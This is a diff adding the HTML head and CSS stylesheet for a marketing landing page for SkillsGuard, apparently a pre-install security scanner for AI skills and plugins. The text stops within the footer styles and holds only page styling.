@@ -1,0 +1,2286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SkillsGuard — Your Pre-Install Scanner for Securing AI Skills</title>
+  <meta name="description" content="SkillsGuard gives developers an explainable risk report for AI skills, agent tools, and plugin repos before they run them. Vibes aren't a security model.">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="SkillsGuard — Pre-Install Security for AI Skills">
+  <meta property="og:description" content="SkillsGuard surfaces explainable risk signals so developers can decide whether to run a skill.">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="SkillsGuard — Pre-Install Security for AI Skills">
+
+  <!-- Fonts (matching Usul's exact font stack) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;700&family=DM+Sans:wght@400;500;700&family=Fragment+Mono&family=Geist:wght@300;400;500;600;700&family=Geist+Mono:wght@400;500;700&family=Space+Mono&display=swap" rel="stylesheet">
+
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: 'Geist', 'DM Sans', -apple-system, sans-serif;
+      font-weight: 300;
+      color: #1a1a1a;
+      background: #fff;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      overflow-x: hidden;
+    }
+    a { text-decoration: none; color: inherit; }
+    img { max-width: 100%; display: block; }
+    ul { list-style: none; }
+    button { cursor: pointer; border: none; background: none; font-family: inherit; }
+
+    :root {
+      --black: #000;
+      --white: #fff;
+      --gray-900: #1a1a1a;
+      --gray-700: #444;
+      --gray-500: #777;
+      --gray-300: #ccc;
+      --gray-200: #e5e5e5;
+      --gray-100: #f5f5f5;
+      --peach: #f5c6a0;
+      --sand: #f0dcc0;
+      --warm-white: #faf5ef;
+    }
+
+    /* ===== 1. ANNOUNCEMENT BAR ===== */
+    .announcement {
+      background: var(--black);
+      color: var(--white);
+      text-align: center;
+      padding: 11px 20px;
+      font-size: 13px;
+      font-weight: 500;
+      letter-spacing: 0.01em;
+      line-height: 1.4;
+    }
+    .announcement a {
+      color: var(--white);
+      transition: opacity 0.2s;
+    }
+    .announcement a:hover { opacity: 0.8; }
+
+    /* ===== 2. NAVBAR ===== */
+    .navbar {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: var(--white);
+      border-bottom: 1px solid var(--gray-200);
+      padding: 0 32px;
+      height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .nav-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .nav-logo-icon {
+      width: 28px;
+      height: 28px;
+    }
+    .nav-logo-text {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 700;
+      font-size: 30px;
+      line-height: 36px;
+      color: var(--black);
+      letter-spacing: -0.02em;
+    }
+    .nav-hamburger {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      padding: 8px;
+    }
+    .nav-hamburger span {
+      display: block;
+      width: 22px;
+      height: 1.5px;
+      background: var(--black);
+    }
+
+    /* ===== 3. HERO ===== */
+    .hero {
+      position: relative;
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      background: #000;
+    }
+    #plexus-canvas,
+    #globe-canvas {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
+    .hero-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(0,0,0,0.15) 0%, rgba(0,0,0,0.3) 50%, rgba(0,0,0,0.5) 100%);
+      z-index: 1;
+    }
+    .hero-content {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      max-width: 820px;
+      padding: 0 24px;
+    }
+    .hero-content h1 {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 500;
+      font-style: normal;
+      font-size: clamp(40px, 6vw, 72px);
+      line-height: 1.05;
+      color: var(--white);
+      margin-bottom: 20px;
+      letter-spacing: -0.02em;
+      text-transform: capitalize;
+    }
+    .hero-content p {
+      font-family: 'Geist', sans-serif;
+      font-size: 17px;
+      line-height: 1.6;
+      color: rgba(255,255,255,0.85);
+      max-width: 540px;
+      margin: 0 auto 36px;
+    }
+    .hero-buttons {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .btn-outline-white {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 12px 24px;
+      border: 1px solid rgba(255,255,255,0.5);
+      border-radius: 0;
+      color: var(--white);
+      font-family: 'Geist', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      transition: all 0.2s;
+      background: rgba(255,255,255,0.08);
+    }
+    .btn-outline-white:hover { background: rgba(255,255,255,0.15); border-color: rgba(255,255,255,0.8); }
+    .btn-solid-black {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 12px 24px;
+      background: var(--black);
+      border: 1px solid var(--black);
+      border-radius: 0;
+      color: var(--white);
+      font-family: 'Geist', sans-serif;
+      font-size: 14px;
+      font-weight: 600;
+      transition: opacity 0.2s;
+    }
+    .btn-solid-black:hover { opacity: 0.85; }
+
+    /* ===== 4. SOCIAL PROOF / LOGO BAR ===== */
+    .customers {
+      padding: 56px 40px;
+      text-align: center;
+      border-bottom: 1px solid var(--gray-200);
+    }
+    .customers h6 {
+      font-family: 'Geist', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--gray-500);
+      margin-bottom: 32px;
+    }
+    .clients-grid {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 40px;
+      flex-wrap: wrap;
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    .client-logo {
+      height: 28px;
+      opacity: 0.35;
+      filter: grayscale(100%);
+      transition: opacity 0.2s;
+    }
+    .client-logo:hover { opacity: 0.6; }
+    .client-logo-text {
+      font-family: 'DM Sans', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--black);
+      opacity: 0.35;
+      letter-spacing: 0.04em;
+    }
+
+    /* ===== 5. FEATURE HIGHLIGHT ===== */
+    .feature-highlight {
+      padding: 80px 40px 60px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .feature-highlight-header {
+      margin-bottom: 40px;
+    }
+    .feature-highlight-header h2 {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 500;
+      font-style: normal;
+      font-size: 36px;
+      color: var(--black);
+      margin-bottom: 8px;
+      letter-spacing: -0.02em;
+    }
+    .feature-highlight-header .learn-link {
+      font-family: 'Geist', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--gray-500);
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .feature-highlight-header .learn-link:hover { color: var(--black); }
+    .cli-showcase {
+      position: relative;
+      width: 100%;
+      min-height: 600px;
+      background-image: url('orange.png');
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 48px;
+    }
+    .cli-terminal {
+      width: 100%;
+      max-width: 680px;
+      background: #0d1117;
+      overflow: hidden;
+      box-shadow: 0 25px 60px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.06);
+      opacity: 0;
+      transform: translateY(24px);
+      transition: opacity 0.7s ease, transform 0.7s ease;
+    }
+    .cli-terminal.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .cli-titlebar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 14px 20px;
+      background: #161b22;
+      border-bottom: 1px solid #21262d;
+    }
+    .cli-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+    .cli-dot.red { background: #ff5f57; }
+    .cli-dot.yellow { background: #febc2e; }
+    .cli-dot.green { background: #28c840; }
+    .cli-titlebar-text {
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      font-size: 12px;
+      color: #8b949e;
+      margin-left: 8px;
+    }
+    .cli-body {
+      padding: 24px;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      font-size: 13px;
+      line-height: 1.7;
+      color: #e6edf3;
+      height: 480px;
+      overflow-y: auto;
+      overflow-x: auto;
+    }
+    .cli-line {
+      white-space: pre;
+      min-height: 1.7em;
+    }
+    .cli-cursor {
+      display: inline-block;
+      width: 8px;
+      height: 15px;
+      background: #e6edf3;
+      vertical-align: text-bottom;
+      animation: blink 1s step-end infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    .t-green { color: #7ee787; }
+    .t-blue { color: #79c0ff; }
+    .t-purple { color: #d2a8ff; }
+    .t-red { color: #ff7b72; }
+    .t-yellow { color: #f0b87a; }
+    .t-dim { color: #8b949e; }
+    .t-white { color: #e6edf3; }
+    .t-bold { color: #ffffff; font-weight: 700; }
+    .t-header { color: #58a6ff; font-weight: 700; }
+    .feature-desc {
+      margin-top: 20px;
+      font-family: 'Geist', sans-serif;
+      font-size: 15px;
+      line-height: 1.65;
+      color: var(--gray-500);
+      max-width: 700px;
+    }
+
+    /* ===== 6. SCROLLING FEATURE CARDS ===== */
+    .features-scroll {
+      padding: 80px 40px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .feature-card-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 48px;
+      align-items: stretch;
+      margin-bottom: 80px;
+    }
+    .feature-card-row:last-child { margin-bottom: 0; }
+    .feature-card-image {
+      border-radius: 0;
+      overflow: hidden;
+      padding: 36px;
+      min-height: 500px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      background-size: cover;
+      background-position: center;
+    }
+    /* --- Overlay system for feature cards --- */
+    .overlay-container {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px;
+      pointer-events: none;
+    }
+    .overlay-panel {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(8px);
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12), 0 2px 8px rgba(0, 0, 0, 0.06);
+      padding: 16px 20px;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      font-size: 13px;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.6s ease, transform 0.6s ease;
+    }
+    .overlay-panel.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* Card 1: stacked alert panels */
+    .overlay-stack {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      width: 100%;
+      max-width: 360px;
+    }
+    .overlay-alert {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 18px;
+    }
+    .alert-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+    .alert-dot.red { background: #ef4444; }
+    .alert-dot.yellow { background: #eab308; }
+    .alert-dot.green { background: #22c55e; }
+    .alert-dot.blue { background: #3b82f6; }
+    .alert-label {
+      font-weight: 600;
+      color: #111;
+      letter-spacing: 0.02em;
+    }
+    .alert-path {
+      margin-left: auto;
+      color: #888;
+      font-size: 12px;
+    }
+
+    /* Card 2: YAML file panel */
+    .overlay-yaml {
+      width: 100%;
+      max-width: 420px;
+      padding: 0;
+    }
+    .yaml-header {
+      padding: 10px 18px;
+      background: #1a1a1a;
+      color: #ccc;
+      font-size: 12px;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      letter-spacing: 0.03em;
+    }
+    .yaml-body {
+      padding: 14px 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .yaml-line {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 12.5px;
+      color: #333;
+    }
+    .yaml-key {
+      color: #6366f1;
+      font-weight: 600;
+      margin-right: 4px;
+    }
+
+    /* Card 3: capability pill badges */
+    .overlay-badges {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      justify-content: center;
+      max-width: 380px;
+    }
+    .overlay-pill {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 18px;
+      font-size: 12.5px;
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      color: #111;
+    }
+
+    /* Card 3: dataflow taint visualization */
+    .overlay-dataflow {
+      width: 100%;
+      max-width: 420px;
+      padding: 0;
+    }
+    .dataflow-header {
+      padding: 10px 18px;
+      background: #1a1a1a;
+      color: #ccc;
+      font-size: 12px;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      letter-spacing: 0.03em;
+    }
+    .dataflow-row {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 11px 18px;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 12px;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+    }
+    .dataflow-row:last-child { border-bottom: none; }
+    .dataflow-source {
+      color: #3b82f6;
+      font-weight: 600;
+      white-space: nowrap;
+    }
+    .dataflow-arrow {
+      color: #999;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+    .dataflow-sink {
+      color: #ef4444;
+      font-weight: 600;
+      white-space: nowrap;
+    }
+    .dataflow-severity {
+      margin-left: auto;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      padding: 2px 6px;
+      border-radius: 2px;
+      flex-shrink: 0;
+    }
+    .dataflow-severity.high { background: #fecaca; color: #dc2626; }
+    .dataflow-severity.med { background: #fef3c7; color: #d97706; }
+
+    /* Card 4: semantic analysis overlay */
+    .overlay-semantic {
+      width: 100%;
+      max-width: 420px;
+      padding: 0;
+    }
+    .semantic-header {
+      padding: 10px 18px;
+      background: #1a1a1a;
+      color: #ccc;
+      font-size: 12px;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      letter-spacing: 0.03em;
+    }
+    .semantic-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 18px;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 12.5px;
+    }
+    .semantic-row:last-child { border-bottom: none; }
+    .semantic-label {
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      color: #111;
+      font-weight: 600;
+      font-size: 12px;
+    }
+    .semantic-path {
+      color: #999;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      font-size: 11px;
+    }
+    .semantic-tag {
+      margin-left: auto;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      padding: 2px 6px;
+      border-radius: 2px;
+      flex-shrink: 0;
+    }
+    .semantic-tag.high { background: #fecaca; color: #dc2626; }
+    .semantic-tag.med { background: #fef3c7; color: #d97706; }
+    .semantic-meta {
+      padding: 10px 18px;
+      font-size: 11.5px;
+      color: #22c55e;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      border-top: 1px solid #f0f0f0;
+    }
+
+    /* Card 4: file list inspector */
+    .overlay-filelist {
+      width: 100%;
+      max-width: 400px;
+      padding: 0;
+    }
+    .filelist-header {
+      padding: 10px 18px;
+      background: #1a1a1a;
+      color: #ccc;
+      font-size: 12px;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      letter-spacing: 0.03em;
+    }
+    .filelist-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 18px;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 12.5px;
+    }
+    .filelist-row:last-child { border-bottom: none; }
+    .filelist-icon {
+      font-size: 14px;
+      flex-shrink: 0;
+      width: 20px;
+      text-align: center;
+    }
+    .filelist-icon.warn { color: #eab308; }
+    .filelist-icon.info { color: #3b82f6; }
+    .filelist-name {
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      color: #111;
+      font-weight: 500;
+    }
+    .filelist-tag {
+      margin-left: auto;
+      color: #999;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    /* Risk report overlay (personalization section) */
+    .overlay-report {
+      width: 100%;
+      max-width: 320px;
+      padding: 0;
+    }
+    .report-header {
+      padding: 12px 18px;
+      background: #1a1a1a;
+      color: #ccc;
+      font-size: 12px;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      letter-spacing: 0.03em;
+      font-weight: 600;
+    }
+    .report-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 18px;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 13px;
+    }
+    .report-label {
+      font-family: 'Geist', sans-serif;
+      font-weight: 600;
+      color: #111;
+    }
+    .report-value {
+      margin-left: auto;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      font-size: 12px;
+      color: #666;
+    }
+    .report-score {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 18px;
+      background: #f8f8f8;
+    }
+    .report-score-label {
+      font-family: 'Geist', sans-serif;
+      font-size: 12px;
+      font-weight: 600;
+      color: #666;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .report-score-value {
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      font-size: 18px;
+      font-weight: 700;
+      color: #ef4444;
+    }
+
+    /* Method card mini-terminal overlays */
+    .method-card-panel {
+      position: absolute;
+      top: 16px;
+      left: 12px;
+      right: 12px;
+      bottom: 45%;
+      z-index: 3;
+      background: #0d1117;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.35), 0 0 0 1px rgba(255, 255, 255, 0.06);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      opacity: 0;
+      transform: translateY(16px);
+      transition: opacity 0.6s ease, transform 0.6s ease;
+    }
+    .method-card-panel.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+    .method-term-bar {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      padding: 10px 14px;
+      background: #161b22;
+      border-bottom: 1px solid #21262d;
+      flex-shrink: 0;
+    }
+    .method-term-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .method-term-dot.red { background: #ff5f57; }
+    .method-term-dot.yellow { background: #febc2e; }
+    .method-term-dot.green { background: #28c840; }
+    .method-term-title {
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      font-size: 11px;
+      color: #8b949e;
+      margin-left: 6px;
+    }
+    .method-term-body {
+      padding: 14px 16px;
+      font-family: 'Geist Mono', 'Fragment Mono', monospace;
+      font-size: 11.5px;
+      line-height: 1.65;
+      color: #e6edf3;
+      flex: 1;
+      overflow: hidden;
+    }
+    .method-term-line {
+      white-space: pre;
+      min-height: 1.65em;
+    }
+
+    .feature-card-text {
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+    .feature-card-text h3 {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 500;
+      font-style: normal;
+      font-size: 36px;
+      color: var(--black);
+      margin-bottom: 0;
+      letter-spacing: -0.01em;
+      line-height: 1.15;
+    }
+    .feature-card-text p {
+      font-family: 'Geist', sans-serif;
+      font-size: 17px;
+      font-weight: 300;
+      line-height: 1.7;
+      color: var(--gray-500);
+      margin-top: auto;
+      margin-bottom: 12px;
+    }
+    .learn-link {
+      font-family: 'Geist', sans-serif;
+      font-size: 15px;
+      font-weight: 400;
+      color: var(--gray-500);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: color 0.2s, gap 0.2s;
+    }
+    .learn-link:hover { color: var(--black); gap: 10px; }
+
+    @media (max-width: 768px) {
+      .feature-card-row {
+        grid-template-columns: 1fr;
+        gap: 24px;
+        margin-bottom: 48px;
+      }
+      .feature-card-image { min-height: 280px; padding: 20px; }
+      .feature-card-text h3 { font-size: 28px; }
+      .overlay-container { padding: 16px; }
+      .overlay-panel { font-size: 11px; padding: 10px 14px; }
+      .overlay-stack { max-width: 100%; }
+      .overlay-yaml, .overlay-filelist { max-width: 100%; }
+      .overlay-badges { max-width: 100%; }
+      .cli-showcase { min-height: 400px; padding: 24px; }
+      .cli-body { height: 360px; }
+    }
+
+    /* ===== 7. QUOTE + STATS ===== */
+    .quote-stats {
+      padding: 100px 40px;
+      background: var(--white);
+    }
+    .quote-stats-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .quote-top {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 48px;
+      align-items: start;
+      margin-bottom: 64px;
+    }
+    .quote-top-text h3 {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 500;
+      font-style: normal;
+      font-size: 42px;
+      color: var(--black);
+      margin-bottom: 24px;
+      line-height: 1.1;
+      letter-spacing: -0.02em;
+    }
+    .quote-top-text p {
+      font-family: 'Geist', sans-serif;
+      font-size: 16px;
+      font-weight: 300;
+      color: var(--gray-500);
+      line-height: 1.65;
+      max-width: 420px;
+      margin-bottom: 24px;
+    }
+    .quote-top-image {
+      overflow: hidden;
+    }
+    .quote-top-image img {
+      width: 100%;
+      display: block;
+    }
+    .stats-row {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 0;
+    }
+    .stat-card {
+      border-top: 1px solid var(--gray-200);
+      padding: 28px 32px 28px 0;
+    }
+    .stat-card:first-child {
+      padding-left: 0;
+    }
+    .stat-label-small {
+      font-family: 'Geist Mono', monospace;
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--gray-500);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 12px;
+    }
+    .stat-heading {
+      font-family: 'Geist', sans-serif;
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--black);
+      margin-bottom: 10px;
+    }
+    .stat-desc {
+      font-family: 'Geist', sans-serif;
+      font-size: 14px;
+      font-weight: 300;
+      color: var(--gray-500);
+      line-height: 1.55;
+    }
+    @media (max-width: 768px) {
+      .quote-top { grid-template-columns: 1fr; }
+      .stats-row { grid-template-columns: 1fr; gap: 0; }
+      .quote-top-text h3 { font-size: 32px; }
+    }
+
+    /* ===== 8. WARM GRADIENT SECTION ===== */
+    .personalization {
+      padding: 100px 40px;
+      background: linear-gradient(160deg, var(--warm-white) 0%, var(--sand) 50%, var(--peach) 100%);
+    }
+    .personalization-inner {
+      max-width: 1100px;
+      margin: 0 auto;
+    }
+    .personalization-header {
+      text-align: center;
+      margin-bottom: 56px;
+    }
+    .personalization-header h2 {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 500;
+      font-style: normal;
+      font-size: 42px;
+      color: var(--black);
+      margin-bottom: 16px;
+      letter-spacing: -0.02em;
+      line-height: 1.1;
+    }
+    .personalization-header p {
+      font-family: 'Geist', sans-serif;
+      font-size: 16px;
+      color: var(--gray-700);
+      line-height: 1.65;
+      max-width: 600px;
+      margin: 0 auto 24px;
+    }
+    .personalization-content {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 48px;
+      align-items: start;
+    }
+    .personalization-screenshot {
+      border-radius: 0;
+      overflow: hidden;
+      position: relative;
+      min-height: 400px;
+      background-image: url('blue.png');
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .steps-list {
+      display: flex;
+      flex-direction: column;
+      gap: 32px;
+    }
+    .step-item {
+      background: rgba(255,255,255,0.6);
+      backdrop-filter: blur(10px);
+      border-radius: 0;
+      padding: 24px;
+      border: 1px solid rgba(255,255,255,0.8);
+    }
+    .step-label {
+      font-family: 'Geist Mono', monospace;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--gray-500);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 8px;
+    }
+    .step-item h4 {
+      font-family: 'Geist', sans-serif;
+      font-weight: 700;
+      font-size: 18px;
+      color: var(--black);
+      margin-bottom: 8px;
+    }
+    .step-item p {
+      font-family: 'Geist', sans-serif;
+      font-size: 14px;
+      color: var(--gray-500);
+      line-height: 1.6;
+    }
+    @media (max-width: 768px) {
+      .personalization-content { grid-template-columns: 1fr; }
+      .personalization-header h2 { font-size: 32px; }
+    }
+
+    /* ===== 9. METHOD GRID ===== */
+    .method {
+      padding: 100px 40px;
+      background: var(--white);
+    }
+    .method-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .method h2 {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 500;
+      font-style: normal;
+      font-size: 42px;
+      color: var(--black);
+      margin-bottom: 48px;
+      letter-spacing: -0.02em;
+    }
+    .method-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 20px;
+    }
+    .method-card {
+      position: relative;
+      border-radius: 0;
+      overflow: hidden;
+      aspect-ratio: 1 / 1.4;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      background-size: cover;
+      background-position: center;
+    }
+    .method-card-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(180deg, rgba(0,0,0,0) 40%, rgba(0,0,0,0.7) 100%);
+      z-index: 1;
+    }
+    .method-card-content {
+      position: relative;
+      z-index: 2;
+      padding: 24px;
+    }
+    .method-card-content h4 {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 700;
+      font-size: 20px;
+      color: var(--white);
+      margin-bottom: 8px;
+    }
+    .method-card-content p {
+      font-family: 'Geist', sans-serif;
+      font-size: 13px;
+      color: rgba(255,255,255,0.8);
+      line-height: 1.5;
+    }
+    @media (max-width: 768px) {
+      .method-grid { grid-template-columns: 1fr 1fr; }
+      .method h2 { font-size: 32px; }
+    }
+    @media (max-width: 480px) {
+      .method-grid { grid-template-columns: 1fr; }
+    }
+
+    /* ===== 10. JOIN US / TEAM CTA ===== */
+    .join-us {
+      padding: 0 40px;
+      max-width: 1200px;
+      margin: 0 auto 100px;
+    }
+    .join-us-card {
+      display: grid;
+      grid-template-columns: 1.2fr 1fr;
+      border-radius: 0;
+      overflow: hidden;
+      background: var(--gray-100);
+    }
+    .join-us-image {
+      min-height: 400px;
+    }
+    .join-us-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    .join-us-text {
+      padding: 60px 48px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    .join-us-text h2 {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 500;
+      font-style: normal;
+      font-size: 36px;
+      color: var(--black);
+      line-height: 1.1;
+      margin-bottom: 16px;
+      letter-spacing: -0.02em;
+    }
+    .join-us-text p {
+      font-family: 'Geist', sans-serif;
+      font-size: 15px;
+      color: var(--gray-500);
+      line-height: 1.65;
+      margin-bottom: 28px;
+    }
+    .btn-large-black {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 16px 32px;
+      background: var(--black);
+      color: var(--white);
+      border-radius: 0;
+      font-family: 'Geist', sans-serif;
+      font-size: 15px;
+      font-weight: 600;
+      transition: opacity 0.2s;
+      align-self: flex-start;
+    }
+    .btn-large-black:hover { opacity: 0.85; }
+    @media (max-width: 768px) {
+      .join-us-card { grid-template-columns: 1fr; }
+      .join-us-text { padding: 40px 32px; }
+      .join-us-text h2 { font-size: 28px; }
+    }
+
+    /* ===== 11. COLLABORATIVE AI FOOTER CTA ===== */
+    .footer-cta {
+      position: relative;
+      min-height: 500px;
+      display: flex;
+      align-items: center;
+      overflow: hidden;
+    }
+    .footer-cta-bg {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: 0;
+    }
+    .footer-cta-overlay {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, rgba(0,0,0,0.75) 0%, rgba(0,0,0,0.4) 100%);
+      z-index: 1;
+    }
+    .footer-cta-content {
+      position: relative;
+      z-index: 2;
+      padding: 80px 60px;
+      max-width: 600px;
+    }
+    .footer-cta-content h2 {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 500;
+      font-style: normal;
+      font-size: 42px;
+      color: var(--white);
+      margin-bottom: 12px;
+      line-height: 1.1;
+      letter-spacing: -0.02em;
+    }
+    .footer-cta-content p {
+      font-family: 'Geist', sans-serif;
+      font-size: 16px;
+      color: rgba(255,255,255,0.75);
+      margin-bottom: 32px;
+      line-height: 1.5;
+    }
+    .footer-cta-buttons {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .btn-large-white {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 14px 28px;
+      background: var(--white);
+      color: var(--black);
+      border-radius: 0;
+      font-family: 'Geist', sans-serif;
+      font-size: 14px;
+      font-weight: 600;
+      transition: opacity 0.2s;
+    }
+    .btn-large-white:hover { opacity: 0.9; }
+    .btn-outline-white-lg {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 14px 28px;
+      border: 1px solid rgba(255,255,255,0.3);
+      border-radius: 0;
+      color: var(--white);
+      font-family: 'Geist', sans-serif;
+      font-size: 14px;
+      font-weight: 500;
+      transition: all 0.2s;
+      background: transparent;
+    }
+    .btn-outline-white-lg:hover { border-color: rgba(255,255,255,0.7); background: rgba(255,255,255,0.05); }
+
+    /* ===== 12. FOOTER ===== */
+    .footer {
+      background: var(--white);
+      border-top: 1px solid var(--gray-200);
+      padding: 64px 40px 0;
+    }
+    .footer-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .footer-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      margin-bottom: 24px;
+    }
+    .footer-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .footer-logo-text {
+      font-family: 'Chakra Petch', sans-serif;
+      font-weight: 700;
+      font-size: 18px;
+      color: var(--black);
+    }
